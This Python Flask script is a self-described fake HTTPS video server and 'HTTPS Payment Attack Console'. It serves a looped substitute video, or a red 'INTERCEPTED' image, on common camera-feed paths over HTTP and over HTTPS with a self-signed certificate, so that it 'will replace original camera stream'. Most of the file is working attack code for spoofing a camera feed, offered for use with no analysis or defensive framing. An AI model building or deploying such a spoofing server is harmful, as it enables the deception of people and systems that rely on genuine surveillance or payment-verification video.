#!/usr/bin/python3
from flask import Flask, Response, render_template_string, request, jsonify
import cv2
import os
import time
import numpy as np
import logging
import ssl

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("FakeHTTPSVideoServer")

app = Flask(__name__)

# Global variables
BASE_DIR = os.path.expanduser("../")
MEDIA_DIR = os.path.join(BASE_DIR, "media")
VIDEOS_DIR = os.path.join(MEDIA_DIR, "videos")
IMAGES_DIR = os.path.join(MEDIA_DIR, "images")
CERT_DIR = os.path.expanduser("~/ssl_certs")

CURRENT_VIDEO = None
video_cap = None
frame_cache = []

# Ensure directories exist
for directory in [MEDIA_DIR, IMAGES_DIR, VIDEOS_DIR, CERT_DIR]:
    os.makedirs(directory, exist_ok=True)

def find_latest_video():
    """Find the latest video file"""
    global CURRENT_VIDEO
    try:
        # First check for link file
        latest_link = os.path.join(VIDEOS_DIR, "latest_video.mp4")
        if os.path.exists(latest_link):
            CURRENT_VIDEO = latest_link
            logger.info(f"Using latest video: {CURRENT_VIDEO}")
            return True
        
        # Otherwise look for the latest video file
        videos = [f for f in os.listdir(VIDEOS_DIR) if f.endswith('.mp4')]
        if videos:
            latest_video = max(videos, key=lambda f: os.path.getmtime(os.path.join(VIDEOS_DIR, f)))
            CURRENT_VIDEO = os.path.join(VIDEOS_DIR, latest_video)
            logger.info(f"Using latest video: {CURRENT_VIDEO}")
            return True
        
        logger.warning("No video files found")
        return False
    except Exception as e:
        logger.error(f"Error finding video: {e}")
        return False

def create_default_image():
    """Create default image"""
    img = np.zeros((480, 640, 3), np.uint8)
    img[:] = (0, 0, 255)  # Red background
    cv2.putText(img, "INTERCEPTED", (150, 240), cv2.FONT_HERSHEY_SIMPLEX, 2, (255, 255, 255), 4)
    return img

def init_video_playback():
    """Initialize video playback"""
    global video_cap, frame_cache, CURRENT_VIDEO
    
    if not find_latest_video():
        logger.warning("No video files found, will use default image")
        return False
    
    try:
        # Open video file
        video_cap = cv2.VideoCapture(CURRENT_VIDEO)
        if not video_cap.isOpened():
            logger.error(f"Cannot open video file: {CURRENT_VIDEO}")
            return False
        
        # Cache some frames
        frame_cache.clear()
        for _ in range(30):
            ret, frame = video_cap.read()
            if not ret:
                break
            frame_cache.append(frame)
        
        logger.info(f"Cached {len(frame_cache)} frames")
        return True
    except Exception as e:
        logger.error(f"Error initializing video: {e}")
        return False

def gen_frames():
    """Generate video frame stream"""
    global video_cap, frame_cache
    
    # Initialize video if needed
    if not video_cap or not video_cap.isOpened():
        if not init_video_playback():
            # Use default image
            default_img = create_default_image()
            while True:
                ret, buffer = cv2.imencode('.jpg', default_img)
                yield (b'--frame\r\n'
                      b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')
                time.sleep(0.033)
    
    frame_index = 0
    
    while True:
        try:
            # Get video frame
            if frame_index < len(frame_cache):
                frame = frame_cache[frame_index].copy()
                frame_index += 1
            else:
                ret, frame = video_cap.read()
                if not ret:
                    # Video ended, loop playback
                    video_cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
                    frame_index = 0
                    if len(frame_cache) > 0:
                        frame = frame_cache[0].copy()
                    else:
                        ret, frame = video_cap.read()
                        if not ret:
                            frame = create_default_image()
            
            # Add timestamp (we've removed the "HTTPS HACKED" text)
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            cv2.putText(frame, timestamp, (10, frame.shape[0] - 20), 
                        cv2.FONT_HERSHEY_SIMPLEX, 0.5, (255, 255, 255), 1, cv2.LINE_AA)
            
            # Convert to JPEG
            ret, buffer = cv2.imencode('.jpg', frame)
            
            # Send frame in original server format
            yield (b'--frame\r\n'
                  b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')
            
            # Control frame rate
            time.sleep(0.033)
            
        except Exception as e:
            logger.error(f"Error generating frame: {e}")
            # Send error image
            error_img = create_default_image()
            cv2.putText(error_img, "ERROR", (150, 280), cv2.FONT_HERSHEY_SIMPLEX, 2, (255, 255, 255), 3)
            
            ret, buffer = cv2.imencode('.jpg', error_img)
            yield (b'--frame\r\n'
                  b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')
            
            # Try to reinitialize video
            try:
                if video_cap:
                    video_cap.release()
                init_video_playback()
            except:
                pass
            
            time.sleep(1)

@app.route('/')
def index():
    """Provide simple HTML page to preview camera"""
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>HTTPS Payment Attack Console</title>
        <style>
            body { font-family: Arial; text-align: center; margin-top: 50px; }
            img { max-width: 800px; border: 1px solid #333; }
            .container { max-width: 900px; margin: 0 auto; }
            .secure-badge { 
                display: inline-block; 
                background-color: green; 
                color: white; 
                padding: 5px 10px; 
                border-radius: 5px; 
                margin-left: 10px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>HTTPS Payment Attack Console <span class="secure-badge">HTTPS Intercept</span></h1>
            <p>Fake HTTPS video stream will replace original camera stream</p>
            <div>
                <img src="/video_feed" />
            </div>
            <p>Video stream started, waiting for attack to take effect...</p>
        </div>
    </body>
    </html>
    """)

# Provide multiple URL paths for support
@app.route('/video_feed')
@app.route('/feed')
@app.route('/camera/feed')
@app.route('/stream')
def video_feed():
    """Provide video stream"""
    response = Response(
        gen_frames(),
        mimetype='multipart/x-mixed-replace; boundary=frame'
    )
    # Add cache control headers
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    response.headers['Connection'] = 'close'
    
    return response

def generate_ssl_cert():
    """Generate self-signed SSL certificate"""
    cert_file = os.path.join(CERT_DIR, "cert.pem")
    key_file = os.path.join(CERT_DIR, "key.pem")
    
    # Check if certificate already exists
    if os.path.exists(cert_file) and os.path.exists(key_file):
        logger.info("Using existing SSL certificate")
        return cert_file, key_file
    
    # Generate new certificate
    logger.info("Generating new self-signed SSL certificate...")
    
    try:
        from OpenSSL import crypto
    except ImportError:
        logger.error("pyopenssl not installed, please run: pip install pyopenssl")
        exit(1)
    
    # Create key pair
    k = crypto.PKey()
    k.generate_key(crypto.TYPE_RSA, 2048)
    
    # Create self-signed certificate
    cert = crypto.X509()
    cert.get_subject().C = "CN"
    cert.get_subject().ST = "State"
    cert.get_subject().L = "City"
    cert.get_subject().O = "Organization"
    cert.get_subject().OU = "Organizational Unit"
    
    import socket
    cert.get_subject().CN = socket.gethostname()
    
    # Set serial number
    import random
    cert.set_serial_number(random.randint(0, 2**64-1))
    
    # Set validity period
    import datetime
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(365*24*60*60)  # One year validity
    
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(k)
    cert.sign(k, 'sha256')
    
    # Write to files
    with open(cert_file, "wb") as f:
        f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
    
    with open(key_file, "wb") as f:
        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
    
    logger.info(f"SSL certificate saved to: {CERT_DIR}")
    
    return cert_file, key_file

if __name__ == '__main__':
    try:
        # Initialize video
        init_video_playback()
        
        # Generate SSL certificate
        cert_file, key_file = generate_ssl_cert()
        
        logger.info("HTTPS fake video server ready to start")
        logger.info("HTTP server running at: http://0.0.0.0:8080")
        logger.info("HTTPS server running at: https://0.0.0.0:8443")
        
        # Start HTTP server
        import threading
        def run_http_server():
            app.run(host='0.0.0.0', port=8080, threaded=True)
            
        http_thread = threading.Thread(target=run_http_server)
        http_thread.daemon = True
        http_thread.start()
        
        # Start HTTPS server (main thread)
        app.run(host='0.0.0.0', port=8443, ssl_context=(cert_file, key_file), threaded=True)
        
    except Exception as e:
        logger.error(f"Error starting server: {e}")
